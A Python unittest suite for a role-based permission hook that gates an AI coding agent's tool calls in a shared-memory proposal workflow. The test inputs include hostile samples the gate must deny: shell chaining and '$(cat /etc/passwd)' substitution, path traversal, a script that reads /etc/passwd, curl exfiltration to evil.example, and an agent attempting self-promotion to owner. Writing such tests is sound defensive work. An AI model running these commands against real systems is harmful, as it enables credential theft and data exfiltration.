"""Every deny in role_gate.py is a claim. These are the claims, tested.

Run: python3 -m unittest discover -s tests

The gate is invoked the way Claude Code invokes it — a subprocess fed one
JSON event on stdin — rather than by importing its functions. A hook that
works when imported and fails when executed is still a broken hook.
"""
import json
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

from support import PROPOSE, REPO

HOOK = REPO / "hooks" / "role_gate.py"


_STATE = tempfile.mkdtemp(prefix="agentport-state-")


def tearDownModule():
    """The beacon is real state. Keep the suite out of the developer's ~."""
    shutil.rmtree(_STATE, ignore_errors=True)


def hook_env(role="contributor", env_extra=None):
    env = {**os.environ, "XDG_STATE_HOME": _STATE}
    env.pop("AGENTPORT_ROLE_FILE", None)
    env.pop("AGENTPORT_PROPOSE_SCRIPT", None)
    if role is None:
        env.pop("AGENTPORT_ROLE", None)
    else:
        env["AGENTPORT_ROLE"] = role
    env.update(env_extra or {})
    return env


def run_hook(tool, tool_input, cwd, role="contributor", env_extra=None):
    """Returns (decision, reason). decision is None when the hook stays silent."""
    env = hook_env(role, env_extra)
    payload = json.dumps({"hook_event_name": "PreToolUse", "tool_name": tool,
                          "tool_input": tool_input, "cwd": str(cwd)})
    r = subprocess.run([sys.executable, str(HOOK)], input=payload,
                       capture_output=True, text=True, env=env, check=False)
    assert r.returncode == 0, f"hook exited {r.returncode}: {r.stderr}"
    if not r.stdout.strip():
        return None, ""
    out = json.loads(r.stdout)["hookSpecificOutput"]
    return out["permissionDecision"], out["permissionDecisionReason"]


class TopicDir(unittest.TestCase):
    """Each test gets a throwaway topic directory."""

    def setUp(self):
        self.dir = pathlib.Path(tempfile.mkdtemp(prefix="agentport-test-"))
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        (self.dir / "pending").mkdir()
        (self.dir / "memory").mkdir()
        (self.dir / "sources").mkdir()
        for s in ("background", "decisions", "people"):
            (self.dir / "memory" / f"{s}.md").write_text(f"# {s}\n")
        (self.dir / "pending" / ".draft.md").write_text("some proposed text\n")
        # skills 在真實的 topic 目錄裡是 symlink 進來的，測試要照著擺，
        # 否則 realpath 那條路徑根本沒被走到
        skills = self.dir / ".claude" / "skills"
        skills.mkdir(parents=True)
        (skills / "propose-memory-update").symlink_to(PROPOSE.parent)
        self.propose = ".claude/skills/propose-memory-update/propose.py"

    def cmd(self, **over):
        a = {"--author": "U123abc", "--section": "decisions",
             "--draft": "pending/.draft.md",
             "--source": "https://example.com/thread/1"}
        a.update(over)
        parts = [sys.executable.split(os.sep)[-1], self.propose]
        for k, v in a.items():
            if v is None:
                continue
            for one in (v if isinstance(v, list) else [v]):
                parts += [k, one]
        return " ".join(parts)


class TestOwnerPassesThrough(TopicDir):
    def test_owner_may_approve(self):
        decision, _ = run_hook("Bash", {"command": "python3 proposal.py approve x.md --sha abc --approver @me"},
                               self.dir, role="owner")
        self.assertIsNone(decision)

    def test_owner_may_write_memory(self):
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                               self.dir, role="owner")
        self.assertIsNone(decision)


class TestRoleResolution(TopicDir):
    def test_unset_role_fails_closed_to_contributor(self):
        decision, reason = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                                    self.dir, role=None)
        self.assertEqual(decision, "deny", reason)

    def test_garbage_role_fails_closed(self):
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                               self.dir, role="OWNER; contributor")
        self.assertEqual(decision, "deny")

    def test_role_file_is_read_when_env_is_absent(self):
        rf = self.dir / "role"
        rf.write_text("owner\n")
        env = {"AGENTPORT_ROLE": "", "AGENTPORT_ROLE_FILE": str(rf)}
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                               self.dir, role="", env_extra=env)
        self.assertIsNone(decision)

    def test_unreadable_role_file_fails_closed(self):
        env = {"AGENTPORT_ROLE": "", "AGENTPORT_ROLE_FILE": str(self.dir / "nope")}
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                               self.dir, role="", env_extra=env)
        self.assertEqual(decision, "deny")

    def test_role_in_the_command_does_not_promote(self):
        """The whole point: the model cannot type its way to owner."""
        decision, _ = run_hook(
            "Bash", {"command": "AGENTPORT_ROLE=owner python3 proposal.py approve x.md"},
            self.dir)
        self.assertEqual(decision, "deny")


class TestContributorWrites(TopicDir):
    def test_draft_is_allowed(self):
        decision, reason = run_hook("Write", {"file_path": "pending/.draft.md", "content": "x"},
                                    self.dir)
        self.assertIsNone(decision, reason)

    def test_absolute_path_to_draft_is_allowed(self):
        decision, reason = run_hook(
            "Write", {"file_path": str(self.dir / "pending" / ".draft.md"), "content": "x"},
            self.dir)
        self.assertIsNone(decision, reason)

    def test_memory_write_is_denied(self):
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md", "content": "x"},
                               self.dir)
        self.assertEqual(decision, "deny")

    def test_forging_a_proposal_file_is_denied(self):
        """Writing pending/<proposal>.md directly would mean choosing your own
        proposed_by and sources — the exact thing propose.py exists to own."""
        decision, _ = run_hook(
            "Write", {"file_path": "pending/2026-01-01T00-00-00-U1-decisions.md",
                      "content": "---\nsection: decisions\n---\n"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_traversal_out_of_pending_is_denied(self):
        decision, _ = run_hook(
            "Write", {"file_path": "pending/../memory/decisions.md", "content": "x"},
            self.dir)
        self.assertEqual(decision, "deny")

    def test_symlinked_draft_escaping_pending_is_denied(self):
        outside = self.dir / "outside"
        outside.mkdir()
        (self.dir / "pending" / "sneak").symlink_to(outside, target_is_directory=True)
        decision, _ = run_hook(
            "Write", {"file_path": "pending/sneak/.draft.md", "content": "x"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_editing_the_hook_itself_is_denied(self):
        decision, _ = run_hook("Write", {"file_path": ".claude/settings.json", "content": "{}"},
                               self.dir)
        self.assertEqual(decision, "deny")

    def test_edit_tool_is_denied(self):
        decision, _ = run_hook("Edit", {"file_path": "pending/.draft.md",
                                        "old_string": "a", "new_string": "b"}, self.dir)
        self.assertEqual(decision, "deny")


class TestContributorReads(TopicDir):
    def test_reads_are_unrestricted(self):
        for tool in ("Read", "Grep", "Glob"):
            with self.subTest(tool=tool):
                decision, _ = run_hook(tool, {"file_path": "memory/decisions.md"}, self.dir)
                self.assertIsNone(decision)


class TestProposeCommand(TopicDir):
    def test_the_legal_invocation_passes(self):
        decision, reason = run_hook("Bash", {"command": self.cmd()}, self.dir)
        self.assertIsNone(decision, reason)

    def test_multiple_sources_pass(self):
        cmd = self.cmd(**{"--source": ["https://example.com/a", "sources/b.md"]})
        decision, reason = run_hook("Bash", {"command": cmd}, self.dir)
        self.assertIsNone(decision, reason)

    def test_equals_form_passes(self):
        cmd = f"python3 {self.propose} --author=U1 --section=decisions " \
              "--draft=pending/.draft.md --source=https://example.com/a"
        decision, reason = run_hook("Bash", {"command": cmd}, self.dir)
        self.assertIsNone(decision, reason)

    def test_approve_is_denied(self):
        decision, _ = run_hook(
            "Bash", {"command": "python3 .claude/skills/approve-proposal/proposal.py approve a.md --sha x --approver @me"},
            self.dir)
        self.assertEqual(decision, "deny")

    def test_reject_is_denied(self):
        decision, _ = run_hook(
            "Bash", {"command": "python3 .claude/skills/approve-proposal/proposal.py reject a.md --rejecter @me --reason no"},
            self.dir)
        self.assertEqual(decision, "deny")

    def test_chaining_after_a_legal_command_is_denied(self):
        for sep in (";", "&&", "||", "|", "\n", "`id`", ">out"):
            with self.subTest(sep=sep):
                decision, reason = run_hook(
                    "Bash", {"command": f"{self.cmd()} {sep} echo pwned"}, self.dir)
                self.assertEqual(decision, "deny", reason)

    def test_command_substitution_is_denied(self):
        cmd = self.cmd(**{"--why": "$(cat /etc/passwd)"})
        decision, _ = run_hook("Bash", {"command": cmd}, self.dir)
        self.assertEqual(decision, "deny")

    def test_unbalanced_quotes_are_denied(self):
        decision, _ = run_hook("Bash", {"command": self.cmd() + ' --why "oops'}, self.dir)
        self.assertEqual(decision, "deny")

    def test_other_interpreters_are_denied(self):
        for exe in ("bash", "sh", "python3x", "python3.11-evil", "env"):
            with self.subTest(exe=exe):
                cmd = self.cmd()
                cmd = exe + cmd[cmd.index(" "):]
                decision, _ = run_hook("Bash", {"command": cmd}, self.dir)
                self.assertEqual(decision, "deny")

    def test_versioned_python_from_a_venv_passes(self):
        cmd = "python3.11" + self.cmd()[len(sys.executable.split(os.sep)[-1]):]
        decision, reason = run_hook("Bash", {"command": cmd}, self.dir)
        self.assertIsNone(decision, reason)

    def test_env_prefix_is_denied(self):
        decision, _ = run_hook("Bash", {"command": "FOO=bar " + self.cmd()}, self.dir)
        self.assertEqual(decision, "deny")

    def test_a_different_propose_py_is_denied(self):
        (self.dir / "propose.py").write_text("print('hi')\n")
        decision, _ = run_hook("Bash", {"command": "python3 propose.py --author U1 --section decisions --draft pending/.draft.md --source https://e.com/a"},
                               self.dir)
        self.assertEqual(decision, "deny")

    def test_pinned_script_rejects_a_lookalike_path(self):
        fake = self.dir / "propose-memory-update"
        fake.mkdir()
        shutil.copy(PROPOSE, fake / "propose.py")
        cmd = self.cmd().replace(self.propose, "propose-memory-update/propose.py")
        decision, _ = run_hook("Bash", {"command": cmd}, self.dir,
                               env_extra={"AGENTPORT_PROPOSE_SCRIPT": str(PROPOSE)})
        self.assertEqual(decision, "deny")

    def test_unknown_section_is_denied(self):
        decision, _ = run_hook("Bash", {"command": self.cmd(**{"--section": "secrets"})}, self.dir)
        self.assertEqual(decision, "deny")

    def test_draft_outside_pending_is_denied(self):
        for bad in ("../.draft.md", "memory/.draft.md", "pending/sub/.draft.md"):
            with self.subTest(draft=bad):
                decision, _ = run_hook("Bash", {"command": self.cmd(**{"--draft": bad})}, self.dir)
                self.assertEqual(decision, "deny")

    def test_draft_that_is_really_a_proposal_is_denied(self):
        decision, _ = run_hook(
            "Bash", {"command": self.cmd(**{"--draft": "pending/real-looking.md"})}, self.dir)
        self.assertEqual(decision, "deny")

    def test_bad_source_is_denied(self):
        for bad in ("file:///etc/passwd", "trust me", "../sources/x.md"):
            with self.subTest(source=bad):
                decision, _ = run_hook("Bash", {"command": self.cmd(**{"--source": bad})}, self.dir)
                self.assertEqual(decision, "deny")

    def test_missing_source_is_denied(self):
        decision, _ = run_hook("Bash", {"command": self.cmd(**{"--source": None})}, self.dir)
        self.assertEqual(decision, "deny")

    def test_unknown_flag_is_denied(self):
        decision, _ = run_hook("Bash", {"command": self.cmd() + " --approver @me"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_author_with_shell_characters_is_denied(self):
        decision, _ = run_hook("Bash", {"command": self.cmd(**{"--author": "'U1 x'"})}, self.dir)
        self.assertEqual(decision, "deny")

    def test_outside_a_topic_directory_is_denied(self):
        elsewhere = pathlib.Path(tempfile.mkdtemp(prefix="agentport-nontopic-"))
        self.addCleanup(shutil.rmtree, elsewhere, ignore_errors=True)
        decision, reason = run_hook("Bash", {"command": self.cmd()}, elsewhere)
        self.assertEqual(decision, "deny")
        self.assertIn("topic directory", reason)


class TestUnknownTools(TopicDir):
    def test_unlisted_tool_is_denied_by_default(self):
        for tool in ("WebFetch", "Task", "NotebookEdit", "", "SomethingNew"):
            with self.subTest(tool=tool):
                decision, _ = run_hook(tool, {}, self.dir)
                self.assertEqual(decision, "deny")

    def test_unparseable_payload_is_denied(self):
        r = subprocess.run([sys.executable, str(HOOK)], input="not json",
                           capture_output=True, text=True, env=hook_env(), check=False)
        self.assertEqual(r.returncode, 0)
        self.assertEqual(json.loads(r.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")


class TestCanary(TopicDir):
    """The canary exists to answer "is this thing on?" from inside the agent."""

    def test_denied_for_both_roles(self):
        for role in ("owner", "contributor"):
            with self.subTest(role=role):
                decision, reason = run_hook(
                    "Bash", {"command": "echo AGENTPORT_GATE_CANARY"}, self.dir, role=role)
                self.assertEqual(decision, "deny")
                self.assertIn("installed and firing", reason)
                self.assertIn(f"role={role}", reason)

    def test_found_in_any_argument_not_just_the_command(self):
        decision, _ = run_hook("Write", {"file_path": "AGENTPORT_GATE_CANARY.md"},
                               self.dir, role="owner")
        self.assertEqual(decision, "deny")

    def test_an_ordinary_command_is_not_a_canary(self):
        decision, _ = run_hook("Bash", {"command": "echo hello"}, self.dir, role="owner")
        self.assertIsNone(decision)


class TestBeacon(TopicDir):
    """Liveness has to be recorded by the hook itself; nothing else can see it fire."""

    def setUp(self):
        super().setUp()
        self.state = pathlib.Path(tempfile.mkdtemp(prefix="agentport-beacon-"))
        self.addCleanup(shutil.rmtree, self.state, ignore_errors=True)
        self.beacon = self.state / "agentport" / "gate-last-fired"

    def fire(self, role="owner", state=None):
        return run_hook("Read", {"file_path": "memory/decisions.md"}, self.dir,
                        role=role, env_extra={"XDG_STATE_HOME": str(state or self.state)})

    def test_written_on_an_allowed_call(self):
        self.assertFalse(self.beacon.exists())
        self.fire()
        self.assertTrue(self.beacon.exists())
        self.assertLess(time.time() - float(self.beacon.read_text().strip()), 30)

    def test_written_on_a_denied_call(self):
        run_hook("Write", {"file_path": "memory/decisions.md"}, self.dir,
                 env_extra={"XDG_STATE_HOME": str(self.state)})
        self.assertTrue(self.beacon.exists(), "a denied call is still a call")

    def test_an_unwritable_beacon_does_not_break_the_gate(self):
        """Failing to record liveness must never stop the gate deciding —
        that would hang the agent. It under-reports instead, which is the
        safe direction: it looks broken rather than looking fine."""
        blocker = self.state / "blocked"
        blocker.write_text("not a directory\n")
        decision, _ = run_hook("Write", {"file_path": "memory/decisions.md"}, self.dir,
                               env_extra={"XDG_STATE_HOME": str(blocker)})
        self.assertEqual(decision, "deny")


class TestSelfTest(TopicDir):
    def run_self_test(self, cwd, env_extra=None):
        return subprocess.run([sys.executable, str(HOOK), "--self-test"], cwd=str(cwd),
                              capture_output=True, text=True,
                              env=hook_env("owner", env_extra), check=False)

    def wired(self, matcher="*", command=None):
        """A topic dir whose .claude/settings.json wires this hook in."""
        home = pathlib.Path(tempfile.mkdtemp(prefix="agentport-home-"))
        self.addCleanup(shutil.rmtree, home, ignore_errors=True)
        (self.dir / ".claude").mkdir(exist_ok=True)
        (self.dir / ".claude" / "settings.json").write_text(json.dumps({
            "hooks": {"PreToolUse": [{"matcher": matcher, "hooks": [
                {"type": "command", "command": command or f"python3 {HOOK}"}]}]}}))
        return {"HOME": str(home)}

    def test_all_rules_hold(self):
        r = self.run_self_test(self.dir, self.wired())
        self.assertIn("✓ contributor may not write memory/", r.stdout)
        self.assertNotIn("✗", r.stdout)
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_missing_wiring_is_a_failure(self):
        home = pathlib.Path(tempfile.mkdtemp(prefix="agentport-home-"))
        self.addCleanup(shutil.rmtree, home, ignore_errors=True)
        r = self.run_self_test(self.dir, {"HOME": str(home)})
        self.assertEqual(r.returncode, 1)
        self.assertIn("no PreToolUse entry", r.stdout)

    def test_a_narrow_matcher_is_flagged(self):
        """matcher: Bash leaves Write free to reach memory/ without a shell."""
        r = self.run_self_test(self.dir, self.wired(matcher="Bash"))
        self.assertEqual(r.returncode, 1)
        self.assertIn("matcher is not '*'", r.stdout)

    def test_a_path_that_does_not_exist_is_flagged(self):
        r = self.run_self_test(self.dir, self.wired(command="python3 /nope/role_gate.py"))
        self.assertEqual(r.returncode, 1)
        self.assertIn("does not exist", r.stdout)

    def test_a_different_copy_is_flagged(self):
        other = pathlib.Path(tempfile.mkdtemp(prefix="agentport-copy-"))
        self.addCleanup(shutil.rmtree, other, ignore_errors=True)
        shutil.copy(HOOK, other / "role_gate.py")
        r = self.run_self_test(self.dir, self.wired(command=f"python3 {other}/role_gate.py"))
        self.assertEqual(r.returncode, 1)
        self.assertIn("different copy", r.stdout)

    def test_liveness_reports_a_recent_firing(self):
        state = pathlib.Path(tempfile.mkdtemp(prefix="agentport-beacon-"))
        self.addCleanup(shutil.rmtree, state, ignore_errors=True)
        run_hook("Read", {"file_path": "x"}, self.dir, role="owner",
                 env_extra={"XDG_STATE_HOME": str(state)})
        env = self.wired()
        env["XDG_STATE_HOME"] = str(state)
        r = self.run_self_test(self.dir, env)
        self.assertIn("last fired", r.stdout)
        self.assertNotIn("never fired", r.stdout)

    def test_liveness_says_never_when_it_has_not_fired(self):
        state = pathlib.Path(tempfile.mkdtemp(prefix="agentport-beacon-"))
        self.addCleanup(shutil.rmtree, state, ignore_errors=True)
        env = self.wired()
        env["XDG_STATE_HOME"] = str(state)
        r = self.run_self_test(self.dir, env)
        self.assertIn("never fired", r.stdout)
        self.assertIn("AGENTPORT_GATE_CANARY", r.stdout)


if __name__ == "__main__":
    unittest.main()


class ReadMemoryDir(TopicDir):
    """A topic that also has read-memory linked in, the way a real one does."""

    def setUp(self):
        super().setUp()
        (self.dir / ".claude" / "skills" / "read-memory").symlink_to(
            REPO / "skills" / "read-memory")
        self.dump = ".claude/skills/read-memory/dump.sh"


class TestReadMemoryDump(ReadMemoryDir):
    """read-memory's SKILL.md tells contributors to call dump.sh. If the gate
    denies it, the skill is a lie and proposals get written blind."""

    def test_contributor_may_dump_memory(self):
        decision, reason = run_hook("Bash", {"command": f"bash {self.dump}"}, self.dir)
        self.assertIsNone(decision, reason)

    def test_arguments_are_denied(self):
        # dump.sh takes none, so anything extra is someone trying a different job.
        decision, _ = run_hook("Bash", {"command": f"bash {self.dump} ../../../etc/passwd"},
                               self.dir)
        self.assertEqual(decision, "deny")

    def test_another_script_named_dump_sh_is_denied(self):
        impostor = self.dir / "pending" / "dump.sh"
        impostor.write_text("#!/bin/sh\ncat /etc/passwd\n")
        decision, _ = run_hook("Bash", {"command": "bash pending/dump.sh"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_a_different_interpreter_is_denied(self):
        decision, _ = run_hook("Bash", {"command": f"sh {self.dump}"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_chaining_onto_a_legal_dump_is_denied(self):
        decision, _ = run_hook("Bash", {"command": f"bash {self.dump} ; id"}, self.dir)
        self.assertEqual(decision, "deny")


class TestChannelTools(TopicDir):
    """The matcher is '*', so every MCP tool reaches the gate. A contributor who
    cannot call reply is a contributor the agent can never answer."""

    def test_reply_is_allowed(self):
        for tool in ("mcp__discord__reply", "mcp__line__reply", "mcp__slack__reply"):
            with self.subTest(tool=tool):
                decision, reason = run_hook(tool, {"chat_id": "1", "text": "hi"}, self.dir)
                self.assertIsNone(decision, reason)

    def test_fetch_messages_is_allowed(self):
        decision, reason = run_hook("mcp__discord__fetch_messages", {"chat_id": "1"},
                                    self.dir)
        self.assertIsNone(decision, reason)

    def test_reading_other_peoples_dms_is_denied(self):
        # Still a read — but not a read of what this conversation already said.
        decision, _ = run_hook("mcp__slack__fetch_user_dms", {"user": "U9"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_an_unrelated_mcp_tool_is_denied(self):
        decision, _ = run_hook("mcp__github__create_issue", {"title": "x"}, self.dir)
        self.assertEqual(decision, "deny")

    def test_a_lookalike_channel_name_is_denied(self):
        decision, _ = run_hook("mcp__slack__reply_all", {"chat_id": "1"}, self.dir)
        self.assertEqual(decision, "deny")


class TestOwnerNotification(TopicDir):
    """The one outbound command a contributor gets. Every dimension is pinned,
    because this is the only place a proposal body could leave the host."""

    OWNER = "U0WNER123"

    def curl(self, channel=None, extra="", url=None):
        channel = channel or self.OWNER
        url = url or "https://slack.com/api/chat.postMessage"
        body = '{"channel":"%s","text":"new proposal"}' % channel
        return (f"curl -s -X POST {url} "
                f'-H "Content-Type: application/json" {extra}'
                f"-d '{body}'")

    def run_curl(self, cmd, owner=OWNER):
        return run_hook("Bash", {"command": cmd}, self.dir,
                        env_extra={"OWNER_SLACK_USER_ID": owner})

    def test_notifying_the_owner_is_allowed(self):
        decision, reason = self.run_curl(self.curl())
        self.assertIsNone(decision, reason)

    def test_denied_when_no_owner_is_configured(self):
        # Empty owner used to make the destination check compare against "",
        # which matched every channel. Now it closes the rule instead.
        decision, reason = self.run_curl(self.curl(), owner="")
        self.assertEqual(decision, "deny")
        self.assertIn("OWNER_SLACK_USER_ID", reason)

    def test_a_different_recipient_is_denied(self):
        decision, _ = self.run_curl(self.curl(channel="UATTACKER"))
        self.assertEqual(decision, "deny")

    def test_a_second_data_flag_is_denied(self):
        # curl takes the last -d, so a trailing one silently swaps the payload.
        decision, _ = self.run_curl(
            self.curl() + " -d '{\"channel\":\"UATTACKER\",\"text\":\"x\"}'")
        self.assertEqual(decision, "deny")

    def test_writing_the_response_to_a_file_is_denied(self):
        decision, _ = self.run_curl(self.curl(extra="-o /tmp/out.json "))
        self.assertEqual(decision, "deny")

    def test_another_url_is_denied(self):
        decision, _ = self.run_curl(self.curl(url="https://evil.example/collect"))
        self.assertEqual(decision, "deny")

    def test_a_second_url_is_denied(self):
        decision, _ = self.run_curl(self.curl() + " https://evil.example/collect")
        self.assertEqual(decision, "deny")

    def test_owner_is_not_restricted_to_this_shape(self):
        decision, _ = run_hook("Bash", {"command": "curl https://example.com"},
                               self.dir, role="owner")
        self.assertIsNone(decision)

    def test_an_unfilled_placeholder_owner_is_denied(self):
        # bot.env ships OWNER_SLACK_USER_ID=UREPLACE_ME. Treating that as a
        # real recipient would arm the rule on a scaffolded, unconfigured topic.
        decision, reason = self.run_curl(self.curl(channel="UREPLACE_ME"),
                                         owner="UREPLACE_ME")
        self.assertEqual(decision, "deny")
        self.assertIn("OWNER_SLACK_USER_ID", reason)
